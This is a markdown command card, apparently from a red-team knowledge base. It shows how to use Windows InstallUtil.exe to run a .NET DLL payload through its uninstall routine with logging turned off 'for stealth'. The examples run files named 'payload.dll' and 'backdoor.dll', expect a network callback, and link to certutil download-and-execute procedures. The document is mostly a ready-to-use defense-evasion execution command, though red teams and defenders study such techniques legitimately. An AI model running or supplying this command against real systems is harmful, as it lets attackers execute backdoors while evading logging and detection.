---
type: command
executor: cmd
data: >-
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=
  /LogToConsole=false /u $_DLL_FILE
output: null
platforms:
  - Windows
tags:
  - installutil
  - execution
verified: true
validated: true
---

# installutil-execute-dll-payload

## Command

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /u $_DLL_FILE
```

## Description

Executes a .NET DLL payload using InstallUtil.exe by invoking its uninstall routine (/u), which triggers the DLL's code without full installation. Suppresses logging for stealth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DLL_FILE | Path to the DLL payload (e.g., payload.dll) | Yes |
| /logfile= | Suppresses log file creation (empty value) | Built-in |
| /LogToConsole=false | Disables console output | Built-in |
| /u | Uninstall mode to execute the DLL entry point | Built-in |

## Examples

### Basic Usage

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /u payload.dll
```

### Advanced Usage

```cmd
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /LogToConsole=false /u backdoor.dll
```
(For 32-bit systems)

## Expected Output

Minimal output due to suppression; success indicated by payload execution (e.g., network callback). Errors show as .NET exceptions if DLL is invalid.

## Related

- [[procedures/Certutil-Download-and-Execute]]
- [[commands/certutil-decode-base64-to-dll]]
